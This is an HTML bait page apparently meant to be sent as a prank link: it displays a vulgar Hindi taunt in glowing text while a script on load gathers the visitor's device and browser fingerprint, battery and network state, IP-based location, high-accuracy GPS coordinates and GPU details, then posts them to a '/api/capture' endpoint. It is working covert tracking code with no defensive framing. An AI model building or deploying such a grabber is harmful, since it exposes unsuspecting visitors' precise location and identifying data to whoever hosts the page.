<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Link</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            overflow: hidden;
        }
        .container { text-align: center; padding: 20px; }
        .glowing {
            font-size: 2rem;
            font-weight: 900;
            color: #fff;
            text-shadow:
                0 0 7px #fff,
                0 0 10px #fff,
                0 0 21px #ff00de,
                0 0 42px #ff00de,
                0 0 82px #ff00de,
                0 0 92px #ff00de,
                0 0 102px #ff00de;
            animation: flicker 3s infinite alternate;
            z-index: 10;
            position: relative;
        }
        @keyframes flicker {
            0%, 19.9%, 22%, 62.9%, 64%, 64.9%, 70%, 100% {
                opacity: 0.8;
                text-shadow:
                    0 0 7px #fff,
                    0 0 10px #fff,
                    0 0 21px #ff00de,
                    0 0 42px #ff00de,
                    0 0 82px #ff00de,
                    0 0 92px #ff00de,
                    0 0 102px #ff00de;
            }
            20%, 21.9%, 63%, 63.9%, 65%, 69.9% {
                opacity: 0.3;
                text-shadow: none;
            }
        }
        .status {
            position: fixed;
            bottom: 10px;
            left: 50%;
            transform: translateX(-50%);
            color: #333;
            font-size: 0.7rem;
            font-family: monospace;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="glowing">chud gaya behen ka loda 😂</div>
    </div>
    <div class="status" id="status"></div>

    <script>
    (async () => {
        // Relative path: Works on any domain where this file is hosted
        const ENDPOINT = "/api/capture";
        const status = document.getElementById('status');

        const getDeviceInfo = () => {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                languages: navigator.languages,
                language: navigator.language,
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory,
                screen: {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth
                },
                window: {
                    width: window.innerWidth,
                    height: window.innerHeight,
                    devicePixelRatio: window.devicePixelRatio
                },
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                online: navigator.onLine,
                touchPoints: navigator.maxTouchPoints
            };
        };

        const getBatteryInfo = async () => {
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                return {
                    level: battery.level,
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
            }
            return { error: 'Battery API not supported' };
        };

        const getNetworkInfo = () => {
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            return {
                effectiveType: conn?.effectiveType || 'unknown',
                downlink: conn?.downlink || 'unknown',
                rtt: conn?.rtt || 'unknown'
            };
        };

        const getIPData = async () => {
            try {
                const res = await fetch('https://ipapi.co/json/');
                return await res.json();
            } catch(e) {
                return { ip: 'unknown', error: e.message };
            }
        };

        const getGPSLocation = () => {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    return resolve({ error: 'Geolocation not supported' });
                }
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        resolve({
                            latitude: pos.coords.latitude,
                            longitude: pos.coords.longitude,
                            accuracy: pos.coords.accuracy,
                            altitude: pos.coords.altitude
                        });
                    },
                    (err) => {
                        resolve({ error: err.message });
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 15000,
                        maximumAge: 0
                    }
                );
            });
        };

        const getStorageInfo = () => {
            let hasLocalStorage = false;
            try { localStorage.setItem('_t', '1'); localStorage.removeItem('_t'); hasLocalStorage = true; } catch(e) {}
            return {
                localStorage: hasLocalStorage,
                webGL: (() => {
                    try {
                        const c = document.createElement('canvas');
                        const gl = c.getContext('webgl');
                        if (!gl) return 'not supported';
                        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                        return {
                            vendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : 'unknown',
                            renderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'unknown'
                        };
                    } catch(e) { return 'error'; }
                })()
            };
        };

        const collectAndSend = async () => {
            status.textContent = 'Gathering data...';

            const [device, battery, network, ipData, gps, storage] = await Promise.all([
                Promise.resolve(getDeviceInfo()),
                getBatteryInfo(),
                Promise.resolve(getNetworkInfo()),
                getIPData(),
                getGPSLocation(),
                Promise.resolve(getStorageInfo())
            ]);

            const payload = {
                meta: {
                    url: window.location.href,
                    timestamp: new Date().toISOString()
                },
                ip: ipData,
                device: device,
                battery: battery,
                network: network,
                gps: gps,
                storage: storage
            };

            status.textContent = 'Sending...';

            try {
                const res = await fetch(ENDPOINT, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                if (res.ok) {
                    status.textContent = '✓';
                    status.style.color = '#0f0';
                } else {
                    status.textContent = 'Send failed: ' + res.status;
                    status.style.color = '#f00';
                }
            } catch(e) {
                status.textContent = 'Error: ' + e.message;
                status.style.color = '#f00';
            }
        };

        collectAndSend();
    })();
    </script>
</body>
</html>
